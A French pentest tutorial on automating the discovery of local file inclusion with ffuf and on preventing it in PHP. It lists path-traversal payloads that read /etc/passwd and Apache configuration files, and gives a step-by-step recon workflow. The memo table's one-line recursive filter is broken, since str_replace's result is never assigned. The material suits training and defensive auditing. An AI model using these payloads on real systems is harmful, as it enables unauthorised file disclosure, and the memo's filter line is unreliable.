# Automatisation et prévention

## Pourquoi

Savoir exploiter manuellement une inclusion de fichiers reste indispensable pour les cas complexes, mais on ne va pas tester 900 payloads à la main sur chaque paramètre. Des outils de fuzzing permettent d'identifier rapidement les points d'entrée vulnérables, les payloads fonctionnels et les fichiers sensibles accessibles sur le serveur. En parallèle, comprendre les mécanismes de prévention aide à orienter les tests (contourner ce qui est en place) et à formuler des recommandations concrètes dans un rapport.

## Comment ça marche

### Fuzzing de paramètres

Les formulaires visibles dans l'interface ne représentent qu'une fraction des paramètres acceptés par une page. Des paramètres cachés, non liés à un formulaire HTML, sont souvent moins sécurisés. On peut les découvrir avec `ffuf` et une wordlist de noms de paramètres courants.

```bash
# - Recherche de paramètres GET cachés sur une page
ffuf -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/index.php?FUZZ=value' \
     -fs 2287
```

Le filtre `-fs` exclut les réponses de taille identique à celle d'une requête sans paramètre valide. Chaque paramètre identifié devient un candidat pour tester une LFI.

{% hint style="info" %}
Cette technique ne se limite pas aux inclusions de fichiers. Un paramètre caché peut aussi être vulnérable à des injections SQL, XSS ou SSRF. Tester systématiquement les paramètres exposés est une bonne pratique pour tout audit web.
{% endhint %}

### Wordlists LFI

Une fois un paramètre identifié, on peut fuzzer ses valeurs avec des wordlists dédiées qui contiennent des payloads d'inclusion avec différents niveaux de traversée et de contournement.

```bash
# - Fuzzing LFI avec la wordlist Jhaddix
ffuf -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/index.php?language=FUZZ' \
     -fs 2287
```

Cette wordlist contient des variantes comme :

| Payload | Technique |
|---|---|
| `../../../../etc/passwd` | Traversée classique |
| `..%2F..%2F..%2Fetc/passwd` | Encodage URL |
| `....//....//....//etc/passwd` | Contournement de filtre non récursif |
| `../../../../../../etc/passwd&=%3C%3C%3C%3C` | Injection avec paramètres supplémentaires |
| `/%2e%2e/%2e%2e/%2e%2e/etc/passwd` | Encodage URL complet |

Chaque résultat positif doit être vérifié manuellement. Un statut 200 ne garantit pas que le contenu du fichier est réellement affiché, il peut s'agir d'un faux positif ou d'une page d'erreur avec le même code de réponse.

### Fuzzing de fichiers serveur

Au-delà de la simple confirmation de la vulnérabilité, le fuzzing permet de cartographier les fichiers accessibles sur le serveur.

**Racine du serveur web**

Si on a besoin du chemin absolu (par exemple pour atteindre un fichier uploadé), on peut fuzzer la racine :

```bash
# - Identification de la racine web
ffuf -w /opt/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
     -fs 2287
```

Le scan retourne typiquement `/var/www/html/` sur un serveur Apache sous Linux.

**Fichiers de configuration et logs**

Des wordlists plus spécialisées permettent de trouver des fichiers de configuration, des logs et d'autres fichiers sensibles :

```bash
# - Fuzzing de fichiers système Linux
ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/index.php?language=../../../../FUZZ' \
     -fs 2287
```

{% hint style="success" %}
La wordlist `LFI-WordList-Linux` (disponible sur GitHub, projet DragonJAR) est plus précise que la wordlist Jhaddix pour identifier les fichiers de configuration. Elle peut révéler des dizaines de fichiers, y compris des chemins que les wordlists génériques ne couvrent pas.
{% endhint %}

Parmi les fichiers les plus utiles :

| Fichier | Intérêt |
|---|---|
| `/etc/apache2/apache2.conf` | DocumentRoot, chemins des logs |
| `/etc/apache2/envvars` | Variables d'environnement Apache (APACHE_LOG_DIR) |
| `/etc/php/7.4/apache2/php.ini` | Configuration PHP (allow_url_include, disable_functions) |
| `/etc/passwd` | Liste des utilisateurs système |
| `/etc/hostname` | Nom de la machine |
| `/var/log/apache2/access.log` | Logs d'accès (utile pour le log poisoning) |

**Enchaînement concret** : lire `apache2.conf` révèle le `DocumentRoot` et le chemin des logs (souvent via la variable `APACHE_LOG_DIR`). Lire ensuite `/etc/apache2/envvars` donne la valeur de cette variable (généralement `/var/log/apache2`). On connaît alors les chemins exacts pour le log poisoning.

### Outils LFI automatisés

Plusieurs outils tentent d'automatiser l'exploitation LFI :

| Outil | Description |
|---|---|
| [LFISuite](https://github.com/D35m0nd142/LFISuite) | Suite d'exploitation LFI avec plusieurs modules |
| [LFiFreak](https://github.com/OsandaMalith/LFiFreak) | Outil de scan et exploitation LFI |
| [liffy](https://github.com/mzfr/liffy) | Outil LFI léger |

{% hint style="warning" %}
La plupart de ces outils sont basés sur Python 2 et ne sont plus activement maintenus. Ils peuvent servir pour un test rapide, mais ne remplaceront jamais la compréhension manuelle des techniques. En audit professionnel, mieux vaut maîtriser ffuf et curl que dépendre d'un outil abandonné.
{% endhint %}

## En pratique

### Workflow complet de reconnaissance LFI

Depuis un conteneur Exegol :

```bash
# - Étape 1 : découvrir les paramètres cachés
ffuf -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/page.php?FUZZ=value' \
     -fs <taille_par_defaut>

# - Étape 2 : tester les payloads LFI sur le paramètre identifié
ffuf -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/page.php?param=FUZZ' \
     -fs <taille_par_defaut>

# - Étape 3 : identifier la racine web
ffuf -w /opt/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/page.php?param=../../../../FUZZ/index.php' \
     -fs <taille_par_defaut>

# - Étape 4 : énumérer les fichiers système accessibles
ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://<IP_CIBLE>:<PORT>/page.php?param=../../../../FUZZ' \
     -fs <taille_par_defaut>

# - Étape 5 : lire les fichiers identifiés
curl -s 'http://<IP_CIBLE>:<PORT>/page.php?param=../../../../etc/apache2/apache2.conf'
```

{% hint style="info" %}
Pour les paramètres LFI, ne pas se limiter au code 200. Les codes 301, 302, 403 et 500 peuvent aussi indiquer un fichier accessible via inclusion, même s'il n'est pas directement consultable en navigation normale.
{% endhint %}

---

## Prévention des inclusions de fichiers

### Éliminer l'entrée utilisateur

La mesure la plus efficace consiste à ne jamais passer d'entrée utilisateur dans une fonction d'inclusion. Le chargement dynamique de contenu doit se faire côté serveur sans intervention de l'utilisateur.

Quand ce n'est pas possible (application existante, architecture complexe), la solution est d'utiliser une **whitelist** qui associe des identifiants à des fichiers :

{% tabs %}
{% tab title="Table de correspondance" %}
```php
// - Approche par table de correspondance
$pages = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php',
];

$page = $_GET['page'] ?? 'home';

if (isset($pages[$page])) {
    include($pages[$page]);
} else {
    include($pages['home']);
}
```
{% endtab %}

{% tab title="Switch/Case" %}
```php
// - Approche par switch
switch ($_GET['page'] ?? 'home') {
    case 'home':
        include('pages/home.php');
        break;
    case 'about':
        include('pages/about.php');
        break;
    default:
        include('pages/home.php');
}
```
{% endtab %}
{% endtabs %}

Dans les deux cas, l'entrée utilisateur ne passe jamais directement dans `include()`. On fait correspondre une clé à un chemin prédéfini.

### Prévention de la traversée de répertoires

Si la whitelist n'est pas applicable, il faut au minimum empêcher la traversée de répertoires.

**basename() en PHP**

La fonction `basename()` extrait uniquement le nom du fichier, sans le chemin :

```php
// - basename() supprime tout le chemin
$file = basename($_GET['language']);
// ../../../../etc/passwd -> passwd
include("languages/" . $file);
```

{% hint style="warning" %}
`basename()` empêche la traversée, mais ne permet plus d'accéder à des sous-répertoires. Si l'application a besoin d'inclure des fichiers dans des sous-dossiers, cette approche est trop restrictive.
{% endhint %}

**Suppression récursive de ../**

Un filtre non récursif (simple `str_replace`) peut être contourné avec des payloads comme `....//`. Un filtre récursif élimine ce risque :

```php
// - Suppression récursive de ../
while (substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
}
```

Ce code continue à supprimer `../` tant qu'il en reste dans la chaîne, même si le résultat d'une première passe en recrée.

{% hint style="danger" %}
Attention aux cas limites entre langages. En bash, les caractères `?` et `*` fonctionnent comme wildcards et peuvent remplacer un `.`. En PHP natif, ce n'est pas le cas. Mais si du code PHP utilise `system()` pour exécuter une commande bash, l'attaquant peut exploiter les wildcards bash pour contourner un filtre PHP. C'est pourquoi il est préférable d'utiliser les fonctions natives du framework plutôt que d'écrire ses propres filtres.
{% endhint %}

### Configuration du serveur web

Plusieurs directives de configuration réduisent l'impact d'une LFI même si elle est présente :

| Directive | Fichier | Effet |
|---|---|---|
| `allow_url_fopen = Off` | php.ini | Empêche l'ouverture de fichiers distants via fopen/include |
| `allow_url_include = Off` | php.ini | Bloque les wrappers data://, input://, et les RFI |
| `open_basedir = /var/www` | php.ini | Restreint l'accès aux fichiers hors du répertoire web |
| `disable_functions = system,exec,...` | php.ini | Désactive les fonctions d'exécution système |

```ini
; - Exemple de durcissement dans php.ini
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www
disable_functions = system,exec,passthru,shell_exec,popen,proc_open
```

**Conteneurisation Docker** : isoler l'application dans un conteneur est une des meilleures protections contre la traversée de répertoires. Même si un attaquant lit `/etc/passwd`, il ne voit que les utilisateurs du conteneur, pas ceux de l'hôte.

**Modules dangereux** : désactiver les extensions inutiles comme `expect` (qui permet l'exécution de commandes via `expect://`) et `mod_userdir` (qui peut exposer les répertoires utilisateurs).

### Web Application Firewall (WAF)

Un WAF comme ModSecurity ajoute une couche de détection supplémentaire. En mode permissif, il journalise les tentatives sans les bloquer, ce qui permet d'ajuster les règles avant de passer en mode bloquant.

{% hint style="info" %}
Un WAF n'est pas une solution définitive. Son rôle est de ralentir l'attaquant et de générer des alertes. Même avec un WAF en place, les logs doivent être surveillés et l'application régulièrement testée, surtout après la publication d'une zero-day sur un framework utilisé (Apache Struts, Rails, Django, etc.).
{% endhint %}

## Pièges et galères

- **Faux positifs du fuzzing** : un statut 200 avec une taille différente peut simplement être une page d'erreur personnalisée. Toujours vérifier manuellement que le contenu du fichier cible est bien affiché.
- **Wordlists incomplètes** : les wordlists génériques ne couvrent pas toutes les configurations. Sur un serveur Nginx, les chemins de logs diffèrent d'Apache. Adapter les wordlists au serveur identifié.
- **open_basedir contournable** : dans certaines versions de PHP, `open_basedir` pouvait être contourné via des liens symboliques ou certains wrappers. Ne pas s'appuyer uniquement sur cette directive.
- **Filtre custom vs fonction native** : écrire son propre filtre anti-traversée est risqué. Les cas limites (encodages, caractères Unicode, chemins Windows) sont nombreux. Privilégier `basename()` ou les fonctions du framework.

## Retour terrain

En audit, la phase de fuzzing automatisé sert de filet de sécurité après les tests manuels. Elle permet de s'assurer qu'on n'a pas oublié un paramètre caché ou un chemin système accessible. En revanche, les outils automatisés (LFISuite et similaires) donnent rarement des résultats fiables sur des applications modernes avec des filtres en place. La combinaison ffuf + curl + compréhension manuelle des wrappers reste l'approche la plus efficace.

Pour les recommandations dans un rapport, la hiérarchie est claire : supprimer l'entrée utilisateur des fonctions d'inclusion (correction définitive), puis whitelist si nécessaire, puis `open_basedir` + désactivation des wrappers distants, et enfin WAF en couche supplémentaire.

## Mémo express

| Élément | Commande / Config |
|---|---|
| Fuzzer les paramètres | `ffuf -w burp-parameter-names.txt:FUZZ -u 'URL?FUZZ=value' -fs <size>` |
| Tester les payloads LFI | `ffuf -w LFI-Jhaddix.txt:FUZZ -u 'URL?param=FUZZ' -fs <size>` |
| Trouver la racine web | `ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'URL?param=../../../../FUZZ/index.php'` |
| Énumérer les fichiers système | `ffuf -w LFI-WordList-Linux:FUZZ -u 'URL?param=../../../../FUZZ'` |
| Bloquer les URL distantes | `allow_url_include = Off` dans php.ini |
| Restreindre l'accès fichier | `open_basedir = /var/www` dans php.ini |
| Filtre récursif (PHP) | `while (substr_count($input, '../')) { str_replace('../', '', $input); }` |
| Extraire le nom de fichier | `$file = basename($_GET['param']);` |

***
